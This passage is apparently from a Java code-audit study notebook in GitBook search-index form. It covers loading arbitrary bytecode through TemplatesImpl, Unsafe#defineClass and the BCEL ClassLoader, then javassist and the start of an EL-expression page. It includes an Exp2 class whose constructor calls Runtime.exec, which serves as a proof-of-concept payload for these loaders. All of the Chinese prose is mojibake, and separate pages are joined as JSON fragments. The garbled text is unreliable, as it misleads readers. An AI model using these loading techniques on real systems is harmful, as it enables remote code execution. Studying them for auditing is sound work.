è½½çš„ç±»è¿˜å¿…é¡»ç»§æ‰¿AbstractTransletç±» æ‰€ä»¥æˆ‘ä»¬çš„æ¶æ„ç±»ä»£ç ä¿®æ”¹å¦‚ä¸‹ï¼š import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Exp2 extends AbstractTranslet { public Exp2() throws IOException { Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } åŠ è½½å­—èŠ‚ç ä»£ç  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.TransformerConfigurationException; import java.io.IOException; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class loadClassFile { public static void main(String[] args) throws IOException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp2.class\")); TemplatesImpl templates = new TemplatesImpl(); Class clazz = templates.getClass(); Field bytecodes = clazz.getDeclaredField(\"_bytecodes\"); Field name = clazz.getDeclaredField(\"_name\"); Field _tfactory = clazz.getDeclaredField(\"_tfactory\"); bytecodes.setAccessible(true); name.setAccessible(true); _tfactory.setAccessible(true); bytecodes.set(templates, new byte[][]{classBytes}); name.set(templates, \"d4m1ts\"); _tfactory.set(templates, new TransformerFactoryImpl()); templates.newTransformer(); } } åˆ©ç”¨Unsafe#defineClassåŠ è½½å­—èŠ‚ç  Unsafeæ˜¯ä½äºsun.miscåŒ…ä¸‹çš„ä¸€ä¸ªç±»ï¼Œä¸»è¦æä¾›ä¸€äº›ç”¨äºæ‰§è¡Œä½çº§åˆ«ã€ä¸å®‰å…¨æ“ä½œçš„æ–¹æ³•ï¼Œå¦‚ç›´æ¥è®¿é—®ç³»ç»Ÿå†…å­˜èµ„æºã€è‡ªä¸»ç®¡ç†å†…å­˜èµ„æºç­‰ï¼Œè¿™äº›æ–¹æ³•åœ¨æå‡Javaè¿è¡Œæ•ˆç‡ã€å¢å¼ºJavaè¯­è¨€åº•å±‚èµ„æºæ“ä½œèƒ½åŠ›æ–¹é¢èµ·åˆ°äº†å¾ˆå¤§çš„ä½œç”¨ã€‚ä½¿ç”¨è¯¥ç±»å¯ä»¥è·å–åˆ°åº•å±‚çš„æ§åˆ¶æƒï¼Œè¯¥ç±»åœ¨sun.miscåŒ…ï¼Œé»˜è®¤æ˜¯BootstrapClassLoaderåŠ è½½çš„ã€‚ è€Œå®ƒé‡Œé¢ä¹Ÿå­˜åœ¨ä¸€ä¸ªdefineClassæ–¹æ³•ï¼Œä¸”ä¸ºpublicå¯ç›´æ¥è°ƒç”¨ ä½†å› ä¸ºUnsafeçš„æ„é€ æ–¹æ³•æ˜¯privateç±»å‹çš„ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡newæ–¹å¼å®ä¾‹åŒ–è·å–ï¼Œåªèƒ½é€šè¿‡å®ƒçš„getUnsafe()æ–¹æ³•è·å–ã€‚ åˆå› ä¸ºUnsafeæ˜¯ç›´æ¥æ“ä½œå†…å­˜çš„ï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼ŒJavaçš„å¼€å‘äººå‘˜ä¸ºUnsafeçš„è·å–è®¾ç½®äº†é™åˆ¶ï¼Œæ‰€ä»¥æƒ³è¦è·å–å®ƒåªèƒ½é€šè¿‡Javaçš„åå°„æœºåˆ¶æ¥è·å–ã€‚ å› ä¸ºå®‰å…¨é—®é¢˜ï¼Œä¸èƒ½ç›´æ¥è°ƒç”¨ ä½†å‰é¢ä¹Ÿè¯´äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„çš„æ–¹å¼æ¥è°ƒç”¨ é€šè¿‡åˆ†æå‘ç°ï¼ŒtheUnsafeä¸ºUnsafeçš„å¯¹è±¡ï¼Œæˆ‘ä»¬åå°„æ‹¿åˆ°è¿™ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•äº† åŠ è½½å­—èŠ‚ç ä»£ç  import sun.misc.Unsafe; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; import java.security.ProtectionDomain; public class loadClassFile { public static void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp.class\")); Class unsafeClass = Unsafe.class; Field theUnsafe = unsafeClass.getDeclaredField(\"theUnsafe\"); theUnsafe.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafe.get(null); Class exp = unsafe.defineClass(\"Exp\", classBytes, 0, classBytes.length, ClassLoader.getSystemClassLoader(), null); exp.newInstance(); } } åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç  BCELï¼ˆByte Code Engineering Libraryï¼‰çš„å…¨ååº”è¯¥æ˜¯Apache Commons BCELï¼Œå±äºApache Commonsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ã€‚å®ƒæä¾›äº†ä¸€ç³»åˆ—ç”¨äºåˆ†æã€åˆ›å»ºã€ä¿®æ”¹Java Classæ–‡ä»¶çš„APIã€‚ä½†å…¶å› ä¸ºè¢«Apache Xalanæ‰€ä½¿ç”¨ï¼Œè€ŒApache Xalanåˆæ˜¯Javaå†…éƒ¨å¯¹äºJAXPçš„å®ç°ï¼Œæ‰€ä»¥BCELä¹Ÿè¢«åŒ…å«åœ¨äº†JDKçš„åŸç”Ÿåº“ä¸­ï¼Œä½äºcom.sun.org.apache.bcel è™½ç„¶è¯´å®ƒåŒ…å«åœ¨åŸç”Ÿåº“å§ï¼Œä½†æ˜¯åœ¨jdk8u251åï¼Œcom.sun.org.apache.bcel.internal.util.ClassLoaderå°±è¢«åˆ é™¤äº†ï¼Œå¦‚æœå•ç‹¬å¼•å…¥äº†å®ƒçš„ä¾èµ–ï¼Œåˆ™è¿˜æœ‰ClassLoaderï¼Œå‚è€ƒ BCEL ClassLoaderå»å“ªäº† ä¾èµ–ï¼š org.apache.bcel bcel 5.2 åœ¨bcelçš„åŒ…ä¸­æœ‰ä¸€ä¸ªClassLoaderï¼Œä»–é‡å†™äº†Javaå†…ç½®çš„ClassLoader#loadClass()æ–¹æ³•ï¼Œåœ¨loadclassæ–¹æ³•ä¸­ä¼šå¯¹ç±»åè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœç±»åä»¥$$BCEL$$å¼€å§‹ï¼Œå°±ä¼šè¿›å…¥createClassæ–¹æ³•ï¼Œ ç„¶ååœ¨createClassæ–¹æ³•é‡Œé¢ï¼Œä¼šè°ƒç”¨Utility.decode()æ¥è§£å¯†ï¼Œæœ€åç”Ÿæˆclazz ä½†å¦‚ä½•ç”Ÿæˆèƒ½ç»™å®ƒè§£å¯†çš„å­—èŠ‚ç å‘¢ï¼Ÿ é€šè¿‡BCELæä¾›çš„ä¸¤ä¸ªç±»Repositoryå’ŒUtilityæ¥å®ç°ï¼š Repositoryï¼šç”¨äºå°†ä¸€ä¸ªClasså…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨javacå‘½ä»¤æ¥ç¼–è¯‘ java æ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼› Utilityï¼šç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼› åˆ©ç”¨ä»£ç  JavaClass javaClass = Repository.lookupClass(Exp.class); String encode = Utility.encode(javaClass.getBytes(), true); System.out.println(encode); new org.apache.bcel.util.ClassLoader().loadClass(\"$$BCEL$$\" + encode).newInstance(); ç»“æœ çœ‹ç€å¾ˆç®€å•å¾ˆå®¹æ˜“ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šå‘ å‘ç‚¹ä¸€ï¼š jdk8u261ï¼ŒUtility.encodeä¸­ï¼ŒGZIPOutputStreamæµä¸ä¼šcloseï¼Œæ‰€ä»¥å†…å®¹å†™ä¸è¿›ByteArrayOutputStreamçš„ï¼ˆç»™ä¿ºæ•´æ‡µäº†ï¼Œç½‘ä¸Šæ²¡æ‰¾åˆ°ä¸€ä¸ªè¯´è¿™ä¸ªé—®é¢˜çš„ï¼Œè¿˜æ˜¯å¾—è‡ªå·±è°ƒè¯•æ‰è¡Œï¼Œç¦»è°±ï¼‰ æ¢äº†ä¸ªä½ç‰ˆæœ¬çš„jdk8u231ï¼Œå°±å…³é—­äº†æµå¯ä»¥å†™å…¥è¿›è¡ŒåŠ å¯†ï¼Œä¿ºä¹Ÿä¸æ‡‚ä¸ºå•¥é«˜ç‰ˆæœ¬åˆ é™¤äº†ï¼Œéš¾é“æ˜¯åˆ é™¤ClassLoaderçš„æ—¶å€™ä¸€èµ·åˆ é™¤äº†ï¼Ÿã€‚ã€‚ã€‚ å‘ç‚¹äºŒï¼š æ¢äº†ä½ç‰ˆæœ¬çš„JDKï¼Œä½†æ˜¯å‡ºç°äº†æ–°çš„é—®é¢˜ï¼Œæç¤ºä¸æ”¯æŒçš„æ“ä½œ è·Ÿäº†ä¸€ä¸‹ï¼Œå‘ç°åœ¨ClassLoader#createClass()æ–¹æ³•ä¸­æœ‰é—®é¢˜ å…¶ä¸­åœ¨è°ƒç”¨setBytes()æ˜¯æç¤ºè¿™ä¸ªæ–¹æ³•è°ƒç”¨ä¼šå¤±è´¥ è·Ÿè¿›ä¸€ä¸‹ï¼Œå‘ç°ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚ã€‚ã€‚ æ‰¾äº†ä¸€å¤§åœˆï¼Œæ²¡å‘ç°æœ‰äººæåˆ°è¿™ä¸ªé—®é¢˜ï¼Œåæ¥ä¸ç»æ„çœ‹åˆ°äº†setBytesçš„è¯´æ˜ï¼Œåœ¨BCEL 6.0çš„æ—¶å€™é—å¼ƒäº†ã€‚ã€‚ã€‚ æ‰€ä»¥éœ€è¦ç”¨ä½äº6.0ç‰ˆæœ¬çš„BCELï¼Œæ¢äº†ä¸ª06å¹´çš„5.2 org.apache.bcel bcel 5.2 æ–¹æ³•æ²¡è¢«é—å¼ƒï¼Œç„¶åè§£å†³äº†è¿™ä¸ªé—®é¢˜ å‚è€ƒ Javaå®‰å…¨-JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç æ–¹æ³• Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/08.javassistå­—èŠ‚ç ç¼–ç¨‹.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/08.javassistå­—èŠ‚ç ç¼–ç¨‹.html","title":"08.javassistå­—èŠ‚ç ç¼–ç¨‹","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ä»‹ç» ä½¿ç”¨ å¸¸ç”¨ç±» ä¾èµ– ä¸¾ä¾‹ å‚è€ƒ ä»‹ç» javassistæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†æã€ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“ï¼Œé€šè¿‡javassistæä¾›çš„APIå¯ä»¥åœ¨javaç¨‹åºè¿è¡Œæ—¶ç¼–è¾‘ä¸€ä¸ªç±»çš„å­—èŠ‚ç ä¿¡æ¯ï¼Œæ”¹å˜è¯¥ç±»çš„ç»“æ„ä¿¡æ¯ã€‚è¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯ä¸€ä¸ªç”¨æ¥å¤„ç†Javaå­—èŠ‚ç çš„ç±»åº“ã€‚ é™¤äº†Javassistï¼Œå¸¸è§çš„å­—èŠ‚ç ç¼–ç¨‹å·¥å…·æœ‰ASMå’Œbyte-buddyï¼Œè¿™ä¸¤ä¸ªå·¥å…·ç›¸å¯¹æ¥è¯´æ›´åŠ åå‘äºåº•å±‚ï¼Œéœ€è¦äº†è§£å…³äºjvmçš„æŒ‡ä»¤ï¼›ä½¿ç”¨javassistå¯ä»¥ä¸éœ€è¦äº†è§£jvmæŒ‡ä»¤ï¼Œåªéœ€ä½¿ç”¨javassistç±»åº“æä¾›çš„APIæ¥å£å°±å¯ä»¥å®ç°å­—èŠ‚ç ç¼–ç¨‹ã€‚ ä½¿ç”¨ å¸¸ç”¨ç±» javassistå­—èŠ‚ç ç¼–ç¨‹å¸¸ç”¨çš„ç±»ï¼š ClassPoolï¼šClassPool ç±»å¯ä»¥æ§åˆ¶çš„ç±»çš„å­—èŠ‚ç ï¼Œä¾‹å¦‚åˆ›å»ºä¸€ä¸ªç±»æˆ–åŠ è½½ä¸€ä¸ªç±»ï¼Œä¸JVMç±»è£…è½½å™¨ç±»ä¼¼ï¼›å®ƒæ˜¯åŸºäºå“ˆå¸Œè¡¨ï¼ˆHashtableï¼‰å®ç°çš„CtClasså¯¹è±¡å®¹å™¨ï¼Œå…¶ä¸­é”®åæ˜¯ç±»åç§°ï¼Œå€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„CtClasså¯¹è±¡ï¼ˆHashtableå’ŒHashmapç±»ä¼¼éƒ½æ˜¯å®ç°mapæ¥å£ï¼Œhashmapå¯ä»¥æ¥æ”¶nullçš„å€¼ï¼Œä½†æ˜¯Hashtableä¸è¡Œï¼‰ã€‚ public static synchronized ClassPool getDefault() // è¿”å›é»˜è®¤çš„ç±»æ± å¯¹è±¡ã€‚ public ClassPath insertClassPath(String pathname) // åœ¨æœç´¢è·¯å¾„çš„å¼€å¤´æ’å…¥ç›®å½•æˆ–jarï¼ˆæˆ–zipï¼‰æ–‡ä»¶ã€‚ public ClassPath insertClassPath(ClassPath cp) // ClassPathåœ¨æœç´¢è·¯å¾„çš„å¼€å¤´æ’å…¥ä¸€ä¸ªå¯¹è±¡ã€‚ public ClassLoader getClassLoader() // è·å–ç±»åŠ è½½å™¨toClass()ï¼ŒgetAnnotations()åœ¨ CtClassç­‰ public CtClass get(String classname) // ä»æºä¸­è¯»å–ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›å¯¹CtClass è¡¨ç¤ºè¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡çš„å¼•ç”¨ã€‚ public ClassPath appendClassPath(ClassPath cp) // å°†ClassPathå¯¹è±¡é™„åŠ åˆ°æœç´¢è·¯å¾„çš„æœ«å°¾ã€‚ public CtClass makeClass(String classname) // åˆ›å»ºä¸€ä¸ªæ–°çš„publicç±» CtClassï¼š CtClassè¡¨ç¤ºç¼–è¯‘æ—¶çš„ä¸€ä¸ªç±»ï¼Œå®ƒæä¾›äº†ç±»çš„æ“ä½œï¼Œå¦‚åœ¨ç±»ä¸­åŠ¨æ€æ·»åŠ æ–°å­—æ®µã€æ–¹æ³•å’Œæ„é€ å‡½æ•°ã€ä»¥åŠæ”¹å˜ç±»ã€çˆ¶ç±»å’Œæ¥å£çš„æ–¹æ³• public void setSuperclass(CtClass clazz) // æ›´æ”¹è¶…ç±»ï¼Œé™¤éæ­¤å¯¹è±¡è¡¨ç¤ºæ¥å£ã€‚ public Class toClass(Lookup lookup) // å°†æ­¤ç±»è½¬æ¢ä¸ºjava.lang.Classå¯¹è±¡ã€‚ public byte[] toBytecode() // å°†è¯¥ç±»è½¬æ¢ä¸ºå­—èŠ‚ç æ•°ç»„ã€‚ public void writeFile() // å°†ç”±æ­¤CtClasså¯¹è±¡è¡¨ç¤ºçš„ç±»æ–‡ä»¶å†™å…¥å½“å‰ç›®å½•ã€‚ public void writeFile(String directoryName) // å°†ç”±æ­¤CtClass å¯¹è±¡è¡¨ç¤ºçš„ç±»æ–‡ä»¶å†™å…¥æœ¬åœ°ç£ç›˜ã€‚ public CtConstructor makeClassInitializer() // åˆ¶ä½œä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ç¨‹åºï¼ˆé™æ€æ„é€ å‡½æ•°ï¼‰ã€‚ CtMethodï¼šè¡¨ç¤ºç±»ä¸­çš„æ–¹æ³•ï¼Œé€šè¿‡å®ƒå¯ä»¥ç»™ç±»åˆ›å»ºæ–°çš„æ–¹æ³•ï¼Œè¿˜å¯ä»¥ä¿®æ”¹è¿”å›ç±»å‹ï¼Œè®¿é—®ä¿®é¥°ç¬¦ç­‰ï¼Œç”šè‡³è¿˜å¯ä»¥ä¿®æ”¹æ–¹æ³•ä½“å†…å®¹ä»£ç  CtFieldï¼šç±»çš„å±æ€§ï¼Œé€šè¿‡å®ƒå¯ä»¥ç»™ç±»åˆ›å»ºæ–°çš„å±æ€§ï¼Œè¿˜å¯ä»¥ä¿®æ”¹å·²æœ‰çš„å±æ€§çš„ç±»å‹ï¼Œè®¿é—®ä¿®é¥°ç¬¦ç­‰ CtConstructorï¼šç”¨äºè®¿é—®ç±»çš„æ„é€ ï¼Œä¸CtMethodç±»çš„ä½œç”¨ç±»ä¼¼ public void setBody(String src) // è®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ public void setBody(CtConstructor src, ClassMap map) // ä»å¦ä¸€ä¸ªæ„é€ å‡½æ•°å¤åˆ¶ä¸€ä¸ªæ„é€ å‡½æ•°ä¸»ä½“ã€‚ public CtMethod toMethod(String name, CtClass declaring, ClassMap map) // å¤åˆ¶æ­¤æ„é€ å‡½æ•°å¹¶å°†å…¶è½¬æ¢ä¸ºæ–¹æ³• ClassClassPathï¼šè¯¥ç±»ä½œç”¨æ˜¯ç”¨äºé€šè¿‡getResourceAsStream()åœ¨java.lang.Classä¸­è·å–ç±»æ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚ public ClassClassPath(Class c) // æ„é€ å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæœç´¢è·¯å¾„ public URL find(String classname) // è·å–æŒ‡å®šç±»æ–‡ä»¶çš„URL public InputStream openClassfile(String classname) // é€šè¿‡getResourceAsStream()è·å–ç±» ä¾èµ– org.javassist javassist 3.28.0-GA ä¸¾ä¾‹ åˆ›å»ºå¯¹è±¡Testï¼Œå¹¶åˆ›å»ºpublic static void main( String[] )æ–¹æ³•ï¼Œæœ€ååå°„è°ƒç”¨ import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //åˆ›å»ºclassPoolç±»æ± å¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); // é€šè¿‡classPoolåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»Test CtClass test = classPool.makeClass(\"Test\"); // åˆ›å»º void main() æ–¹æ³•ï¼Œï¼ˆæ–¹æ³•çš„è¿”å›å€¼ç±»å‹ä½ ï¼Œæ–¹æ³•åï¼Œæ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œæ–¹æ³•æ‰€å±çš„ç±»ï¼‰ CtMethod mainMethod = new CtMethod(CtClass.voidType, \"main\", new CtClass[]{classPool.get(String[].class.getName())}, test); // è®¾ç½®mainæ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦ public static mainMethod.setModifiers(Modifier.PUBLIC + Modifier.STATIC); // è®¾ç½®æ–¹æ³•å†…å®¹ mainMethod.setBody(\"System.out.println(\\\"test\\\");\"); // æ·»åŠ æ–¹æ³• test.addMethod(mainMethod); // å†™å…¥å½“å‰ç›®å½•ï¼Œè¿è¡Œåä¼šåœ¨å½“å‰é¡¹ç›®çš„æ ¹ç›®å½•ç”Ÿæˆ Test.class æ–‡ä»¶ test.writeFile(); // è®²testè½¬æ¢ä¸ºå­—èŠ‚ç æ•°ç»„è¾“å‡º System.out.println(Arrays.toString(test.toBytecode())); // ç”ŸæˆClasså¯¹è±¡ï¼Œåå°„è°ƒç”¨mainæ–¹æ³• Class aClass = test.toClass(); Object o = aClass.newInstance(); aClass.getDeclaredMethod(\"main\", String[].class).invoke(o, new String[1]); } } åˆ›å»ºæ„é€ å‡½æ•°ï¼Œå’Œåˆšæ‰çš„å·®ä¸å¤šï¼Œå¾®æ”¹å³å¯ import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //åˆ›å»ºclassPoolç±»æ± å¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); // é€šè¿‡classPoolåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»Test CtClass test = classPool.makeClass(\"Test\"); // åˆ›å»ºæ„é€ å‡½æ•° CtConstructor constructor = new CtConstructor(null, test); // è®¾ç½®mainæ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦ public constructor.setModifiers(Modifier.PUBLIC); // è®¾ç½®æ–¹æ³•å†…å®¹ constructor.setBody(\"System.out.println(\\\"test\\\");\"); // æ·»åŠ æ–¹æ³• test.addConstructor(constructor); // å†™å…¥å½“å‰ç›®å½•ï¼Œè¿è¡Œåä¼šåœ¨å½“å‰é¡¹ç›®çš„æ ¹ç›®å½•ç”Ÿæˆ Test.class æ–‡ä»¶ test.writeFile(); // ç”ŸæˆClasså¯¹è±¡ï¼Œç„¶åç”Ÿæˆå®ä¾‹ Class aClass = test.toClass(); Object o = aClass.newInstance(); } } å‚è€ƒ 10-javaå®‰å…¨åŸºç¡€â€”â€”javassistå­—èŠ‚ç ç¼–ç¨‹ Javaå®‰å…¨ä¹‹JavassiståŠ¨æ€ç¼–ç¨‹ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/09.ELè¡¨è¾¾å¼.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/09.ELè¡¨è¾¾å¼.html","title":"09.ELè¡¨è¾¾å¼","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ä»‹ç» å¿«é€Ÿæ­å»ºtomcatç¯å¢ƒ å‰æœŸå‡†å¤‡ ç¯å¢ƒæ­å»º ELè¡¨è¾¾å¼ä½¿ç”¨ ELåŸºç¡€è¯­æ³• [ ]ä¸.è¿ç®—ç¬¦ è·å–å˜é‡ä¸¾ä¾‹ æ“ä½œç¬¦ éšå«å¯¹è±¡ å‡½æ•° ç¦ç”¨/å¯ç”¨ELè¡¨è¾¾å¼ ELè¡¨è¾¾å¼æ³¨å…¥ ELè¡¨è¾¾å¼æ³¨å…¥ç»•è¿‡ å‚è€ƒ ä»‹ç» EL å…¨åä¸ºExpression Languageï¼Œæ˜¯ä¸ºäº†ä½¿JSPå†™èµ·æ¥æ›´åŠ ç®€å•ã€‚è¡¨è¾¾å¼è¯­è¨€çš„çµæ„Ÿæ¥è‡ªäº ECMAScript å’Œ XPath è¡¨è¾¾å¼è¯­è¨€ï¼Œå®ƒæä¾›äº†åœ¨ JSP ä¸­ç®€åŒ–è¡¨è¾¾å¼çš„æ–¹æ³•ï¼Œè®©Jspçš„ä»£ç æ›´åŠ ç®€åŒ–ã€‚ ELä¸»è¦ä½œç”¨ï¼š è·å–æ•°æ® ELè¡¨è¾¾å¼ä¸»è¦ç”¨äºæ›¿æ¢JSPé¡µé¢ä¸­çš„è„šæœ¬è¡¨è¾¾å¼ï¼Œä»¥ä»å„ç§ç±»å‹çš„webåŸŸ ä¸­æ£€ç´¢javaå¯¹è±¡ã€è·å–æ•°æ®ã€‚(æŸä¸ªwebåŸŸ ä¸­çš„å¯¹è±¡ï¼Œè®¿é—®javabeançš„å±æ€§ã€è®¿é—®listé›†åˆã€è®¿é—®mapé›†åˆã€è®¿é—®æ•°ç»„) æ‰§è¡Œè¿ç®— åˆ©ç”¨ELè¡¨è¾¾å¼å¯ä»¥åœ¨JSPé¡µé¢ä¸­æ‰§è¡Œä¸€äº›åŸºæœ¬çš„å…³ç³»è¿ç®—ã€é€»è¾‘è¿ç®—å’Œç®—æœ¯è¿ç®—ï¼Œä»¥åœ¨JSPé¡µé¢ä¸­å®Œæˆä¸€äº›ç®€å•çš„é€»è¾‘è¿ç®—ã€‚${user==null} è·å–webå¼€å‘å¸¸ç”¨å¯¹è±¡ EL è¡¨è¾¾å¼å®šä¹‰äº†ä¸€äº›éšå¼å¯¹è±¡ï¼Œåˆ©ç”¨è¿™äº›éšå¼å¯¹è±¡ï¼Œwebå¼€å‘äººå‘˜å¯ä»¥å¾ˆè½»æ¾è·å¾—å¯¹webå¸¸ç”¨å¯¹è±¡çš„å¼•ç”¨ï¼Œä»è€Œè·å¾—è¿™äº›å¯¹è±¡ä¸­çš„æ•°æ®ã€‚ è°ƒç”¨Javaæ–¹æ³• ELè¡¨è¾¾å¼å…è®¸ç”¨æˆ·å¼€å‘è‡ªå®šä¹‰ELå‡½æ•°ï¼Œä»¥åœ¨JSPé¡µé¢ä¸­é€šè¿‡ELè¡¨è¾¾å¼è°ƒç”¨Javaç±»çš„æ–¹æ³•ã€‚ å¿«é€Ÿæ­å»ºtomcatç¯å¢ƒ å› ä¸ºéœ€è¦ä½¿ç”¨åˆ°JSPæ¥å­¦ä¹ ELè¡¨è¾¾å¼ï¼Œæ‰€ä»¥æƒ³æ³•æ˜¯å¿«é€Ÿæ­ä¸€ä¸ªtomcatç¯å¢ƒï¼Œä¹‹å‰é‡‡ç”¨çš„æ˜¯æ·»åŠ tomcatä¾èµ–åˆ°pom.xmlçš„æ–¹æ³•ï¼Œä½¿ç”¨å†…ç½®tomcatï¼Œä½†æ˜¯æ„Ÿè§‰æ­å»ºç¯å¢ƒé€Ÿåº¦å¤ªæ…¢äº†ï¼Œæ‰€ä»¥å­¦äº†ä¸ªæ–°çš„æ–¹æ³•æ¥å¿«é€Ÿæ­å»ºtomcatç¯å¢ƒ å‚è€ƒï¼šhttps://blog.51cto.com/u_15119353/3309943 å‰æœŸå‡†å¤‡ tomcatå¯ç”¨ç‰ˆ IDEA tomcatå„ç‰ˆæœ¬ä¸‹è½½åœ°å€ï¼šhttps://archive.apache.org/dist/tomcat/tomcat-8/ ç¯å¢ƒæ­å»º å…ˆå»ºä¸€ä¸ªå¹³å¹³æ— å¥‡çš„Javaé¡¹ç›® ç„¶åå³é”®ï¼Œé€‰æ‹©Add Framework Support... å‹¾é€‰Web Application è¿™ä¸ªæ—¶å€™å°±ä¼šå¤šä¸€ä¸ªwebç›®å½•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„webappsç›®å½• æ‰“å¼€Project Structureçª—å£ï¼Œæ–°å»º2ä¸ªæ–‡ä»¶å¤¹åœ¨WEB-INFç›®å½•ä¸‹ï¼Œåˆ†åˆ«æ˜¯classeså’Œlibï¼Œè¿™ä¸€æ­¥æ˜¯ä¸ºäº†æ·»åŠ é¡¹ç›®ç±»è·¯å¾„ ä¿®æ”¹ç¼–è¯‘åçš„ç±»è·¯å¾„åˆ°æˆ‘ä»¬åˆšæ‰æ–°å»ºçš„classesç›®å½•ä¸‹ æ·»åŠ æœ¬åœ°tomcatæœåŠ¡å™¨ é…ç½®å¥½éœ€è¦çš„ä¿¡æ¯ï¼Œç„¶åFixä¿®å¤ä¸€ä¸‹ ç»™åº”ç”¨ä¸Šä¸‹æ–‡è·¯å¾„è®¾ç½®ä¸ºè·Ÿè·¯å¾„ï¼Œå¦‚æœè¿™é‡Œè®¾ç½®ä¸º/a åˆ™è®¿é—®å°±å˜æˆ localhost:8080/a/ ç„¶åå¯åŠ¨è¿è¡Œå³å¯ é¡¹ç›®ç»“æ„ ELè¡¨è¾¾å¼ä½¿ç”¨ ELåŸºç¡€è¯­æ³• åœ¨JSPä¸­è®¿é—®æ¨¡å‹å¯¹è±¡æ˜¯é€šè¿‡ELè¡¨è¾¾å¼çš„è¯­æ³•æ¥è¡¨è¾¾ã€‚æ‰€æœ‰ELè¡¨è¾¾å¼çš„æ ¼å¼éƒ½æ˜¯ä»¥${}è¡¨ç¤ºã€‚ 